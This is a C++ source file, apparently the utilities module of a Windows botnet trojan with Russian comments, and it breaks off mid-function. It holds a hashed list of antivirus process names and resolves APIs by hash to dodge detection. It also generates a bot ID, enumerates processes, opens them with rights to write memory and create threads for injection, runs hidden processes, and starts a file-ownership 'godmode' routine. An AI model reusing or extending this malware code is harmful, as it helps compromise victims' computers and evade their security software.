#include <windows.h>
#include <tlhelp32.h>
#include <shlobj.h>
#include <Iphlpapi.h>

#include "GetApi.h"
#include "Strings.h"
#include "Crypt.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "BotUtils.h"
#include "md5.h"
#include "ntdll.h"
#include "inject.h"

//#include "BotDebug.h"

//namespace UTILSDEBUGSTRINGS
//{
//	#include "DbgTemplates.h"
//}


//#define DBG UTILSDEBUGSTRINGS::DBGOutMessage<>



//#include "BotDebug.h"


namespace Utils_Debug
{
    #include "DbgTemplates.h"
}
#define OutMessages  Utils_Debug::DBGOutMessage<>


//--------------------------------------------------
//  Сгенерированный идентификатор машины
//--------------------------------------------------
char MachineID[17] = {0};


//--------------------------------------------------
//  Список имён процессов анти вирусов
//--------------------------------------------------
const static DWORD AV_HASHES[] = {
0x66328A61 /* avgcsrvx.exe*/, 0xE212D301 /* avgemcx.exe*/, 0x126BD3AC /* avgidsagent.exe*/,
0x7316C7CA /* avgnsx.exe*/, 0x7316B7CA /* avgrsx.exe*/, 0xF230AF11 /* avgtray.exe*/,
0xC21C8E60 /* avgwdsvc.exe*/, 0x3338B71A /* vprot.exe*/, 0x6D6B2D81 /* toolbarupdater.exe*/,
0xC316E7EA /* avgfws.exe*/, 0xC63C8E63 /* avastsvc.exe*/, 0xF43EB7B0 /* avastui.exe*/,
0x123EF381 /* afwserv.exe*/, 0x2232E388 /* avguard.exe*/, 0x9D16D2A3 /* avshadow.exe*/,
0x2434E312 /* avgnt.exe*/, 0x361EDF4B /* sched.exe*/, 0xA010DE48 /* avwebgrd.exe*/,
0x581AC378 /* avmailc.exe*/, 0x5336ABA8 /* avfwsvc.exe*/, 0x9512E3CB /* egui.exe*/,
0xE512D3F3 /* ekrn.exe*/, 0xBB1A46E1 /* dwengine.exe*/, 0xA17A2789 /* dwservice.exe*/,
0xF2EC13EA /* dwnetfilter.exe*/, 0xD96A6F68 /* frwl_svc.exe*/, 0x6D4D4D3E /* frwl_notify.exe*/,
0xA28A73A4 /* spideragent.exe*/, 0x5D8FBD2 /* avp.exe*/, 0x1566CB2C /* op_mon.exe*/,
0x35D8FB7A /* acs.exe*/, 0xB312A703 /* ccsvchst.exe*/, 0x5A16AAA5 /* elogsvc.exe*/,
0x35D8C722 /* nhs.exe*/, 0xD6392B8D /* nigsvc32.exe*/, 0xC232A8FE /* niguser.exe*/,
0x5012BCFF /* njeeves.exe*/, 0x65D8C713 /* nnf.exe*/, 0x56392DCD /* npfsvc32.exe*/,
0x4332A8F2 /* npfuser.exe*/, 0x4706A8F3 /* nprosec.exe*/, 0x5634EA46 /* npsvc32.exe*/,
0x4612B3E4 /* nsesvc.exe*/, 0x431EC35D /* nvcoas.exe*/, 0x9504A71A /* nvoy.exe*/,
0x6F1AC743 /* zanda.exe*/, 0x85D89703 /* zlh.exe*/, 0xBC1D1798 /* popwndexe.exe*/,
0xB302DFA3 /* ravmond.exe*/, 0xD232EF25 /* rsmgrsvc.exe*/, 0xE630B753 /* rstray.exe*/,
0x5D8F352 /* cfp.exe*/, 0x351ECFE2 /* clps.exe*/, 0xD938B333 /* clpsls.exe*/,
0x241A9060 /* cmdagent.exe*/, 0xE010405B /* unsecapp.exe*/, 0x6530FE17 /* avkproxy.exe*/,
0xA859A78A /* avkservice.exe*/, 0xFE30AF11 /* avktray.exe*/, 0xAE36EBB8 /* avkwctl.exe*/,
0x13EF358 /* gdscan.exe*/, 0x5C8A82BB /* gdfirewalltray.exe*/, 0x5336AA21 /* gdfwsvc.exe*/,
0x308083C /* akvbackupservice.exe*/, 0xD0B8CE46 /* tsnxgservice.exe*/,
0x2416F3A0 /* bdagent.exe*/, 0x163EEBC9 /* vsserv.exe*/, 0x964CAAC2 /* updatesrv.exe*/,
0xB8961762 /* uiwatchdog.exe*/, 0x5800381D /* coreserviceshell.exe*/, 0xF2B6E078 /* coreframeworkhost.exe*/,
0xA014596B /* uiseagnt.exe*/, 0xC13EAFE2 /* pctssvc.exe*/, 0x4614B358 /* pctsauxs.exe*/,
0x613EFFFA /* pctsgui.exe*/, 0xF7309AF0 /* fpavserver.exe*/, 0x675EABDD /* fprottray.exe*/,
0x2416EB12 /* agent.exe*/, 0x6530B75E /* iptray.exe*/, 0xDC02AFEA /* psimsvc.exe*/,
0x3608C3C2 /* pshost.exe*/, 0x9038A01F /* pavsrvx86.exe*/, 0xD630AB3B /* psctrls.exe*/,
0xC30CDF42 /* pavjobs.exe*/, 0x460EB3EB /* psksvc.exe*/, 0x430AABA9 /* pavfnsvr.exe*/,
0x1138B3F2 /* tpsrv.exe*/, 0xE5323AD3 /* webproxy.exe*/, 0xBB1AE6A1 /* avengine.exe*/,
0x1532AB89 /* pavprsrv.exe*/, 0x3300DF92 /* srvload.exe*/, 0x9D1C9F10 /* apvxdwin.exe*/,
0x2710CB99 /* pavbckpt.exe*/, 0x7606B7C9 /* fsorsp.exe*/, 0xAEB36B09 /* fsgk32st.exe*/,
0xE62FAE04 /* fshoster32.exe*/, 0x5616D1CD /* fsgk32.exe*/, 0x5602F9CD /* fsma32.exe*/,
0x3610E7E8 /* fsdfwd.exe*/, 0x433EC9FE /* fsm32.exe*/, 0x97419EA /* msseces.exe	*/,
0xA416F063 /* mcagent.exe*/, 0xAD0753FA /* mcshield.exe*/, 0xB3057B03 /* mcsvhost.exe*/,
0x3014C080 /* mfefire.exe*/, 0x5034B491 /* mfevtps.exe*/, 0xE33D0F92 /* mcpvtray.exe*/,
0x241C40C5 /* bullguard.exe*/, 0xA3C533B0 /* bullguardbhvscanner.exe*/,
0xBD449831 /* bullguardscanner.exe*/, 0xB1E27B7E /* bullguardupdate.exe*/,
0xE53078D4 /* emlproxy.exe*/, 0x2C0910A4 /* onlinent.exe*/, 0xC53EB3E4 /* opssvc.exe*/,
0xDD00AFA9 /* quhlsvc.exe*/, 0x5C30CBAB /* sapissvc.exe*/, 0x9404D70A /* scanmsg.exe*/,
0xDB38CB8A /* scanwscs.exe*/, 0x5402AF22 /* sbamsvc.exe*/, 0x7B3ECFDA /* sbantray.exe*/,
0x5C0CCB6B /* sbpimsvc.exe*/, 0x88303343 /* vbcmserv.exe*/, 0x6C30774B /* vbsystry.exe*/,
0x3436E381 /* adaware.exe*/, 0xE2207309 /* adawarebp.exe*/, 0x98FCA456 /* adawareservice.exe*/,
0x1707FDB5 /* wajamupdater.exe*/, 0x85289F88 /* arcaconfsv.exe*/, 0x8B26BF8F /* arcamainsv.exe*/,
0xCE5FED2B /* arcaremotesvc.exe*/, 0xD16A6442 /* arcataskservice.exe*/,
0xA302EB22 /* avmenu.exe*/, 0x10263220 /* guardxkickoff.exe*/, 0x377149C9 /* guardxservicce.exe*/,
0x3B14890D /* confirm.dll*/, 0x551E89FA /* core.dll*/, 0xE300B1F2 /* flash.dll*/,
0xE50A81C2 /* imun.dll*/, 0xC004A9A5 /* imunsvc.exe*/, 0x45D8C74A /* net.exe*/,
0x1504EBC6 /* net1.exe*/, 0x2608B1FA /* share.dll*/, 0x45D8F30B /* cmd.exe*/,
0x7538DB13 /* ping.exe*/, 0x42AAE902 /* panda_url_filtering.exe*/, 0xAB06DF0A /* psanhost.exe*/,
0xB0CE7D1 /* psunmain.exe*/, 0x9906EFA4 /* solocfg.exe*/, 0x2A3090E4 /* solosent.exe*/,
0x96B217F2 /* vba32ldr.exe*/, 0xCE0E58F3 /* vbascheduler.exe*/,
0};


//----------------------------------------------------------------------------

HANDLE WINAPI StartThread( LPVOID lpStartAddress, LPVOID param )
{
    DWORD lpThreadId; 
    return pCreateThread( NULL, NULL, (LPTHREAD_START_ROUTINE)lpStartAddress, param, NULL, &lpThreadId );
}

void RunThread( LPVOID lpStartAddress, LPVOID param )
{
	pCloseHandle( StartThread( lpStartAddress, param ) );
}
//----------------------------------------------------------------------------

char *GetOSInfo()
{
	char *BotOS = (char*)MemAlloc( 1024 );

	if ( BotOS == NULL )
	{
		return NULL;
	}

	//char Unknown[] = { 'u','n','k','n','o','w','n' };
	
	char WinSeven[]  = {'W','i','n','d','o','w','s',' ','S','e','v','e','n',0};
	char Win2008R2[] = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','8',' ','R','2',0};

	char Win2008[]   = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','8',0};
	char WinVista[]  = {'W','i','n','d','o','w','s',' ','V','i','s','t','a',0};
	char WinXP[]	 = {'W','i','n','d','o','w','s',' ','X','P',0};
	char Win2003R2[] = {'W','i','n','d','o','w','s',' ','S','e','r','v','e','r',' ','2','0','0','3',' ','R','2',0};
	char Win2003[]   = {'W','i','n','d','o','w','s',' ','2','0','0','3',0};
	char Win2000[]   = {'W','i','n','d','o','w','s',' ','2','0','0','0',0};

	char *ret = NULL;//Unknown;

	OSVERSIONINFOEXA OSVersion;
		
	OSVersion.dwOSVersionInfoSize = sizeof( OSVERSIONINFOEXA );

	if ( !pGetVersionExA( (OSVERSIONINFOA*)&OSVersion ) )
	{
		return NULL;
	}

	if ( OSVersion.dwMajorVersion == 6  )
	{
		if ( OSVersion.dwMinorVersion == 1 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinSeven;
			}
			else
			{
				ret = Win2008R2;
			}
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			if ( OSVersion.wProductType == VER_NT_WORKSTATION )
			{
				ret = WinVista;
			}
			else
			{
				ret = Win2008;
			}
		}
	}
	else if ( OSVersion.dwMajorVersion == 5 )
	{
		if ( OSVersion.dwMinorVersion == 2 )
		{
			if ( pGetSystemMetrics( SM_SERVERR2 ) != 0 )
			{
				ret = Win2003R2;
			}
			else
			{
				ret = Win2003;
			}
		}
		else if ( OSVersion.dwMinorVersion == 1 )
		{
			ret = WinXP;
		}
		else if ( OSVersion.dwMinorVersion == 0 )
		{
			ret = Win2000;
		}		
	}

	if ( ret == NULL )
	{
		return NULL;
	}

	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

	if ( m_lstrlen( OSVersion.szCSDVersion ) )
	{
		_pwsprintfA( BotOS, "%s %s", ret, OSVersion.szCSDVersion );
	}
	else
	{
		_pwsprintfA( BotOS, "%s", ret );
	}

	BotOS[ m_lstrlen( BotOS ) ] = '\0';

	char *Ret = BotOS;

	return Ret;
}


/*

char * FileToMD5(char *URL)
{
	//char *BotId = (char*)MemAlloc( 2048 );
	MD5_CTX ctx;	

	MD5Init(&ctx);
	MD5Update( &ctx, (unsigned char*)URL, m_lstrlen( URL ) );

	unsigned char buff[16];
	MD5Final( buff, &ctx );
	char * UidHash =(char*)MemAlloc( 33 );

	int p = 0;
	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
	
	for( int i = 0; i < 16; i++ )
	{
		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
		p += 2;
	}	
	
	UidHash[32] = 0;

	
return UidHash;
}
*/


// добавлено при добавлении оперы
/************************************************************************/
/*
DWORD FileSize(HANDLE hFile)
{
	DWORD filesizeHigh = 0;
	DWORD filesizeLow  = 0;
	filesizeLow = (DWORD)pGetFileSize(hFile, &filesizeHigh);

	return (DWORD)(Int64ShllMod32((unsigned hyper)filesizeHigh, 32) | filesizeLow);
	//return ((((unsigned hyper)filesizeHigh) << 32) | filesizeLow);
}
*/
/************************************************************************/
/*                          Читает файл в буфер                         */
/*----------------------------------------------------------------------*/
/*
int ReadWholeFile(char *szFileName, char **OutBuf, int *Error)
{
	*Error = NOERROR;
	int result = 0;

	// Открываем файл на чтение
	HANDLE hFile = pCreateFileA(szFileName, GENERIC_READ, FILE_SHARE_READ, NULL,
														OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	// Если не удалось прочесть, выходим с ошибкой
	if (INVALID_HANDLE_VALUE != hFile)
	{
		DWORD fSize = FileSize(hFile);
		if (fSize > 0)
		{
			DWORD rSize = 0;  
			//*OutBuf = new char[fSize + 1];
			//SecureZeroMemory(*OutBuf, fSize + 1);
			*OutBuf = (char *)MemAlloc(SIZE_T(fSize) + 1);
			if (pReadFile(hFile, *OutBuf, fSize, &rSize, NULL))
				result = rSize;
		}
		// Закрываем файл
		pCloseHandle(hFile);
	}
	// Возвращаем результат
	if (!result)
		*Error = pGetLastError();
	return result;
}



*/



//------------------------------------------------------------ 
//генирация нового уида
int myHashData(DWORD lpData, DWORD dwDataSize) 
{
	DWORD dwResult = 0;
	_asm 
	{
		pushad	
		mov edi, lpData
		mov ebx, 0 //hash
		mov ecx, 0 //cr
		mov eax, dwDataSize		
		cmp eax, 0
		jle ERR_BAD_LEN		
	REPEAT_LABEL:
		xor cl, BYTE ptr [edi]  // cr
		xor bl, BYTE ptr [edi]  // cl 
	WHILE_LABEL:
		sub cl, 32
	 		//.endw
		cmp cl, 32
		jge WHILE_LABEL
		rol ebx, cl
		inc edi
		mov dl, BYTE ptr [edi] // cr
		dec eax		
		cmp eax, 0
		jne REPEAT_LABEL
	ERR_BAD_LEN:
		mov dwResult, ebx	
		popad	
		mov eax, dwResult
	}
}


PCHAR MakeMachineID()
{
	//данная функция вернет указатель на массив с идентификаторм машины
	if (MachineID[0] != 0)
		return MachineID;

	m_memset(MachineID, 0, sizeof(MachineID));

    // Генерируем идентификатор
	char szRegPath1[] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\0";
	char szDigitalProductId[] = "DigitalProductId\0";
	char szInstallDate[] = "InstallDate\0";
	char szRegId[] = "RegId\0";

	DWORD dwMakeMachineID_done = 0;
	DWORD iBufferSize = 0;
	int flShouldMakeUniqID = 0;
	DWORD dwExtraHashForMachineID = 0;

	// really run only once
	if (!dwMakeMachineID_done)
	{
		// try to open some reg key
		HKEY hKey = 0;
		if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS )
		{
			// prepare pCryptKeyBuff
			PVOID pCryptKeyBuff;
			//теоретически правельно использовать размер в страницу, ибо в МСДН написано что все что больше нее храниться не в реестре
			//но читаемый размер всегда равен 164 байта берем с небольшим запасом
			pCryptKeyBuff = STR::Alloc(200); ///pGlobalAlloc(GPTR, 10240);
			// init buffer with not-null pre-defined data to avoid clear data in registry in case of absent DigitalProductId in registry
			m_memset(pCryptKeyBuff, 0x30, 100);

			// try to query DigitalProductId
			iBufferSize = 200;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szDigitalProductId, NULL, NULL, (LPBYTE) pCryptKeyBuff, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// make dwExtraHashForMachineID value
			iBufferSize = 4;
			if ( pRegQueryValueExA(hKey, (LPCSTR)szInstallDate, NULL, NULL, (LPBYTE) &dwExtraHashForMachineID, &iBufferSize) != ERROR_SUCCESS ) 
			{
				flShouldMakeUniqID+=1; 
			}
			// check if we should create / use some uniq id
			if (flShouldMakeUniqID > 0) 
			{
				// first try to read existing extra value into dwGeneratedMachineIDExtraValue
				DWORD dwGeneratedMachineIDExtraValue = 0;
				iBufferSize = 4;
				if ( pRegQueryValueExA(hKey, (LPCSTR)szRegId, NULL, NULL, (LPBYTE) &dwGeneratedMachineIDExtraValue, &iBufferSize) != ERROR_SUCCESS ) 
				{	
					// failed to read extra value, get it from ticks
					// NB: we should use it ONLY if id saved successfully - otherwise to protect self from constant change of 
					//     machine ids, leave dwGeneratedMachineIDExtraValue 0
					dwGeneratedMachineIDExtraValue = (DWORD)pGetTickCount();

					// now try to save it in registry - close read-only handle
					pRegCloseKey(hKey); 

					// try to open in write mode
					if ( pRegOpenKeyExA(HKEY_LOCAL_MACHINE, (LPCSTR)szRegPath1, 0, KEY_READ + KEY_WRITE, &hKey) == ERROR_SUCCESS ) 
					{					
						// try write key, with error-checking
						if ( pRegSetValueExA(hKey, (LPCSTR)szRegId, NULL, REG_DWORD, (LPBYTE) &dwGeneratedMachineIDExtraValue, 4) != ERROR_SUCCESS ) 
						{
							 dwGeneratedMachineIDExtraValue=0;
						}
					} else { dwGeneratedMachineIDExtraValue=0; }
 				}

				// use extra value in any case
				dwExtraHashForMachineID = dwExtraHashForMachineID ^ dwGeneratedMachineIDExtraValue;
			}

			// close reg key
			pRegCloseKey( hKey );

			// shift pCryptKeyBuff pointer by 8 bytes
			// *** now this is MakeMachineID_step2 contents ***

			// make hash from WinID (16+1 bytes from pCryptKeyBuff) [HASH PART 1]
			LPVOID pWinId = (PVOID)((DWORD)pCryptKeyBuff + 8);
			DWORD dwHash1 = myHashData( (DWORD)pWinId, (int)plstrlenA((LPCSTR)pWinId) ) ^ dwExtraHashForMachineID;

			//printf("hash p1 = %04Xh dwExtraHashForMachineID = %04Xh\n", dwHash1, dwExtraHashForMachineID);

			// and part2 using Computer name
			iBufferSize = MAX_COMPUTERNAME_LENGTH+1;
			PCHAR pCompName = STR::Alloc(iBufferSize);//pGlobalAlloc( GPTR,  iBufferSize);
			pGetComputerNameA( (LPSTR)pCompName, &iBufferSize);
			DWORD dwHash2 = myHashData( (DWORD)pCompName, (int)plstrlenA((LPSTR)pCompName));
			STR::Free(pCompName);	// pGlobalFree(pCompName);
			STR::Free((PCHAR)pCryptKeyBuff);
			//pGlobalFree(pCryptKeyBuff);
	
			// combine dwHash1 + dwHash2 into szMachineID
			typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
			fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
			char szMID_format[] = "%08X%08X";

			
			_pwsprintfA(MachineID, szMID_format, dwHash1, dwHash2);
			
			//printf(szMachineID);
		}
	}

	return MachineID;
}


//------------------------------------------------------------
string GenerateBotID2(const char* Prefix)
{
	string Result = Prefix;

	if (Result.IsEmpty())
		Result = GetPrefix();

	PCHAR tmp_BotUid = MakeMachineID();

	Result += "0";
	Result += tmp_BotUid;

	return Result;
}


//------------------------------------------------------------
void GenerateUid(char *BotUid)
{
	PCHAR tmp_BotUid = MakeMachineID();

	m_lstrcpy( BotUid, GetPrefix().t_str());
	m_lstrcat( BotUid, "0" );
	m_lstrcat( BotUid, tmp_BotUid );

//	return;


	///далее идет старая
//	char *BotId = (char*)MemAlloc( 2048 );
//
//	DWORD dwUsernameLen = 255;
//	DWORD dwComputerLen = 255;
//
//	char *User = (char*)MemAlloc( 255 );
//	char *Comp = (char*)MemAlloc( 255 );
//	char *Proc = (char*)MemAlloc( 255 );
//
//	if ( BotId == NULL || User == NULL ||
//		 Comp  == NULL || Proc == NULL )
//	{
//		return;
//	}
//
//	if ( (BOOL)pGetUserNameA( User, &dwUsernameLen ) )
//		m_lstrcat(BotId, User );
//
//	if ( (BOOL)pGetComputerNameA( Comp, &dwComputerLen ) )
//		m_lstrcat( BotId, Comp );
//
//	if ( (DWORD)pGetEnvironmentVariableA( "PROCESSOR_IDENTIFIER", Proc, 255 ) )
//		m_lstrcat( BotId, Proc );
//
//	MemFree(User);
//	MemFree(Comp);
//	MemFree(Proc);
//
////--------------------------
//
//	HW_PROFILE_INFOA HwProfInfo;
//
//	if ( (BOOL)pGetCurrentHwProfileA( &HwProfInfo ) )
//    {
//		m_lstrcat( BotId, HwProfInfo.szHwProfileGuid );
//		m_lstrcat( BotId, HwProfInfo.szHwProfileName );
//    }
//
//	char *OS = GetOSInfo();
//
//
//	if ( OS != NULL )
//		m_lstrcat( BotId, OS );
//
//	MemFree(OS);
//
////--------------------------
//
//	DWORD dwSerial = 0;
//
//	typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
//	fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );
//
//	if ( (BOOL)pGetVolumeInformationA( 0, NULL, 0, &dwSerial, 0, 0, NULL, 0 ) )
//		_pwsprintfA(BotId + m_lstrlen(BotId), "%d", dwSerial );
//
//	MD5_CTX ctx;
//
//	MD5Init(&ctx);
//	MD5Update( &ctx, (unsigned char*)BotId, m_lstrlen( BotId ) );
//
//	unsigned char buff[16];
//
//	MD5Final( buff, &ctx );
//
//	char UidHash[33];
//
//	int p = 0;
//
//	for( int i = 0; i < 16; i++ )
//	{
//		_pwsprintfA( &UidHash[p], "%02X", buff[i] );
//		p += 2;
//	}
//
//	UidHash[32] = '\0';
//
//	m_lstrcpy( BotUid, Prefix);
//	m_lstrcat( BotUid, "0" );
//	m_lstrcat( BotUid, UidHash );
//
//	BotUid[ m_lstrlen(BotUid) ] = 0;
//
//    MemFree(BotId);
//
//	return;
}




LPVOID GetInfoTable(DWORD dwTableType )
{
	LPVOID lpPtr = NULL;

	DWORD dwSize = 0x8000;

	NTSTATUS Status = 0;

	do
	{
		lpPtr = MemAlloc( dwSize );

		if ( lpPtr == NULL )
		{
			return NULL;
		}

		Status = (DWORD)pZwQuerySystemInformation( (SYSTEMINFOCLASS) dwTableType, lpPtr, dwSize, NULL );

		if ( Status == STATUS_INFO_LENGTH_MISMATCH )
		{
			MemFree( lpPtr );
			dwSize = dwSize * 2;
		}
	} while ( Status == STATUS_INFO_LENGTH_MISMATCH );

	if ( Status == STATUS_SUCCESS )
	{
		return lpPtr;
	}

	MemFree( lpPtr );

	return NULL;
}

DWORD GetCurrentSessionId()
{
	PPEB Peb = NULL;

    __asm
	{
		mov eax, FS:[0x30]
		mov [Peb], eax
	}

	return Peb->SessionId;
}



DWORD GetProcessIdByHash( DWORD dwHash )
{
	LPVOID Buf = GetInfoTable( SystemProcessInformation );
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)Buf;

	DWORD dwSessionId = 0;

	DWORD dwPid = (DWORD)-1;

	if (pProcess != NULL)
	{
		dwSessionId = GetCurrentSessionId();

		do
		{
			if ( dwSessionId == pProcess->uSessionId )
			{
				if ( pProcess->usName.Length )
				{
					DWORD ProcessHash = STRW::Hash(pProcess->usName.Buffer, 0, true);

					if (ProcessHash  == dwHash )
					{
						dwPid = pProcess->uUniqueProcessId;
						break;
					}
				}
			}			

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree(Buf);

	return dwPid;
}



DWORD GetProcessHashOfId(DWORD dwPid)
{
	OBJECT_ATTRIBUTES ObjectAttributes =	{ sizeof( ObjectAttributes ) } ;
	PUNICODE_STRING	puStr;
	DWORD hash = (DWORD)-1;
	ULONG len;

	CLIENT_ID ClientID;
	ClientID.UniqueProcess = (HANDLE)dwPid;
	ClientID.UniqueThread  = 0;

	HANDLE hProcess = NULL;


	if ( pZwOpenProcess( &hProcess,  PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
		return (DWORD)-1;
	
	
	puStr = (PUNICODE_STRING)MemAlloc( sizeof(UNICODE_STRING) + sizeof(WCHAR)*(MAX_PATH+1) );
	if (puStr)
	{
		puStr->Length = 0;
		len = puStr->MaximumLength = sizeof(WCHAR)*MAX_PATH ;
		puStr->Buffer =(PWCHAR) (sizeof(UNICODE_STRING) + (PCHAR)puStr); 
		m_memset(puStr->Buffer,0, puStr->MaximumLength);

		//0xa638ce5f	
	
		if((NTSTATUS)pZwQueryInformationProcess(hProcess,ProcessImageFileName,puStr,len,&len) == STATUS_SUCCESS)
		{
			hash = GetNameHash(puStr->Buffer);
		}
		MemFree(puStr);
	};

	pZwClose(hProcess);
	return hash;
};

char *GetProcessList()
{
	PSYSTEM_PROCESS_INFORMATION pProcess = (PSYSTEM_PROCESS_INFORMATION)GetInfoTable( SystemProcessInformation );	
	
	char *ProcessList = NULL;

	if ( pProcess != NULL )
	{
		do
		{
			if ( pProcess->usName.Length )
			{
				PCHAR ProcessName = WSTR::ToAnsi(pProcess->usName.Buffer, 0);
				m_lstrlwr( ProcessName );

				if ( ProcessList == NULL )
				{
					if ( ( ProcessList = (char*)MemAlloc( m_lstrlen( ProcessName ) + 1 ) ) == NULL )
					{
						return NULL;
					}

					m_lstrcpy( ProcessList, ProcessName );
				}
				else
				{
					char *p = (char*)MemRealloc( ProcessList, m_lstrlen( ProcessList ) + m_lstrlen( ProcessName ) + 2 );

					if ( p == NULL )
					{
						return NULL;
					}

					ProcessList = p;

					m_lstrcat( ProcessList, "," );
					m_lstrcat( ProcessList, ProcessName );
				}
			    STR::Free(ProcessName);
			}

			pProcess = (PSYSTEM_PROCESS_INFORMATION)((DWORD)pProcess + pProcess->uNext );

		} while ( pProcess->uNext != 0 );
	}

	MemFree( pProcess );

	return ProcessList;
}


HANDLE OpenProcessEx( DWORD dwHash )
{
	DWORD dwPid = GetProcessIdByHash( dwHash );

	if ( dwPid != -1 )
	{
		OBJECT_ATTRIBUTES ObjectAttributes = { sizeof( ObjectAttributes ) } ;
		CLIENT_ID ClientID;

		ClientID.UniqueProcess = (HANDLE)dwPid;
		ClientID.UniqueThread  = 0;

		HANDLE hProcess;
		
		if ( pZwOpenProcess( &hProcess, PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, &ObjectAttributes, &ClientID ) != STATUS_SUCCESS )
		{
			return NULL;
		}

		return hProcess;
	}

	return NULL;
}
//-----------------------------------------------------------------------------

bool InternalRunFile(bool Unicode, PCHAR Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread)
{
	// Функция запускает выполнение процесса

	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	m_memset( &si, 0, sizeof( STARTUPINFOW ) );	
	m_memset( &pi, 0, sizeof( PROCESS_INFORMATION ) );	
	
	si.cb		   = sizeof( STARTUPINFO );
	si.dwFlags     = STARTF_USESHOWWINDOW;
	si.wShowWindow = 1;

	bool Started;

	if (Unicode)
		 Started = (BOOL)pCreateProcessW( NULL, (LPCWSTR)Path, NULL, NULL, FALSE, dwFlags, NULL, NULL, &si, &pi ) != 0;
	else
    	 Started = (BOOL)pCreateProcessA( NULL, Path, NULL, NULL, FALSE, dwFlags, NULL, NULL, (STARTUPINFOA*)&si, &pi ) != 0 ;

	if (Started)
	{
		if (hProcess != NULL)
			*hProcess = pi.hProcess;
		if (hThread != NULL)
			*hThread  = pi.hThread;

		return true;
	}	
	return false;
}
//-----------------------------------------------------------------------------

bool RunFileEx(WCHAR *Path, DWORD dwFlags, PHANDLE hProcess, PHANDLE hThread)
{
	return InternalRunFile(true, (PCHAR)Path, dwFlags, hProcess, hThread);
}
//-----------------------------------------------------------------------------

bool RunFileW(PWCHAR FileName)
{
	return InternalRunFile(true, (PCHAR)FileName, NORMAL_PRIORITY_CLASS, NULL, NULL);
}
//-----------------------------------------------------------------------------

bool RunFileA( PCHAR FileName, bool wait, bool hideConsole )
{
	HANDLE hProcess;
	HANDLE hThread;
	DWORD flags = NORMAL_PRIORITY_CLASS;
	if( hideConsole ) flags |= CREATE_NO_WINDOW;
	if( InternalRunFile(false, FileName, flags, &hProcess, &hThread) )
	{
		if( wait )
		{
			pWaitForSingleObject( hProcess, INFINITE );
	        pCloseHandle(hThread);
		    pCloseHandle(hProcess);
		}
		return true;
	}
	return false;
}
//-----------------------------------------------------------------------------

DWORD GetVirtualFreeAddr()
{
	DWORD dwAddr = (DWORD)GetProcAddressEx( NULL, 1, 0x5C17EC75 );
	return dwAddr;
}

/*

DWORD GetFileHash( WCHAR *File )
{
	if ( !File )
	{
		return (DWORD)-1;
	}

	HANDLE hFile = (HANDLE)pCreateFileW( File, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );

	if ( hFile == INVALID_HANDLE_VALUE )
	{
		return (DWORD)-1;
	}

	DWORD h = 0;
	DWORD dwFileSize = (DWORD)pGetFileSize( hFile, &h );

	HANDLE hMapFile = (HANDLE)pCreateFileMappingW( hFile, 0, PAGE_READONLY, 0, dwFileSize, 0 );

	if ( hMapFile == INVALID_HANDLE_VALUE )
	{
		return (DWORD)-1;
	}

	LPBYTE pbyFile  = (LPBYTE)pMapViewOfFile( hMapFile, FILE_MAP_READ, 0, 0, 0 );

	char Hash[33];
	m_memset( Hash, 0, 33 );

	if ( pbyFile != NULL )
	{
		MD5_CTX ctx;	

		MD5Init(&ctx);
		MD5Update( &ctx, (unsigned char*)pbyFile, dwFileSize );

		unsigned char buff[16];	

		MD5Final( buff, &ctx );

		typedef int ( WINAPI *fwsprintfA )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
		fwsprintfA _pwsprintfA = (fwsprintfA)GetProcAddressEx( NULL, 3, 0xEA3AF0D7 );

		int p = 0;

		for( int i = 0; i < 16; i++ )
		{
			_pwsprintfA( &Hash[p], "%02X", buff[i] );
			p += 2;
		}	
		
		Hash[32] = '\0';	
	}

	pUnmapViewOfFile( pbyFile );

	pCloseHandle( hFile );
	pCloseHandle( hMapFile );

	if ( !m_lstrlen( Hash ) )
	{
		return (DWORD)-1;
	}

	return CalcHash( Hash );
}

*/

bool GodmodeOnFile( WCHAR *Filename )
{
	BOOLEAN bWasEnabled;
	pRtlAdjustPrivilege( SE_TAKE_OWNERSHIP_PRIVILEGE, TRUE, FALSE, &bWasEnabled );

	HANDLE hToken = NULL;
	pOpenProcessToken( pGetCurrentProcess(), TOKEN_QUERY, &hToken );
	
	PTOKEN_USER pTokenUser = (PTOKEN_USER)MemAlloc( 0x200 );

	if ( pTokenUser == NULL )
	{
		return false;
	}

